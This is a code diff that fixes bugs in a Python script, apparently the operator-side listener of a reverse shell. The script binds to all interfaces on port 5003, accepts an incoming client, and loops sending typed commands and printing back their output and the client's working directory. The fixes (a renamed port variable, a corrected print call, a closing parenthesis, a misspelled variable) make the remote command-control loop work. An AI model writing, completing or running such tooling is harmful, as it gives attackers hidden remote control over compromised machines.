@@ -7,7 +7,7 @@
 import socket
 
 SERVER_HOST = "0.0.0.0"  # Why 0.0.0.0 tho? Reachable at every IPs
-SERVER_HOST = 5003
+SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 128  # 128KB is max size of messages
 
 # separator string for sending 2 messages in 1 go
@@ -26,13 +26,13 @@ print(f"Listening as {SERVER_HOST}:{SERVER_PORT}    ...")
 
 # accept all attempted connections
 client_socket, client_address = s.accept()  # returns a new socket
-printf(f"{client_socket[0]} : {client_address[1]} ... Connected!")
+print(f"{client_address[0]}:{client_address[1]} ... Connected!")
 
 
 # Receiving the current working directory of the client
 # Encode the message to bytes & send using client_socket
 cwd = client_socket.recv(BUFFER_SIZE).decode()
-print("[+] Current working directory:", cwd)
+print("[+] Current working directory: ", cwd)
 
 while True:
     # get command from input
@@ -45,9 +45,10 @@ while True:
     if command.lower() == "exit":
         break  # if the command is exit, break out bruuh
     # get command results
-    output = client_socket.recv(BUFFER_SIZE.decode()
+    output = client_socket.recv(BUFFER_SIZE).decode()
+
     # split command output & current workgin directory
-    results, cwd=ouput.split(SEPARATOR)
+    results, cwd = output.split(SEPARATOR)
 
     # print out contents
     print(results)
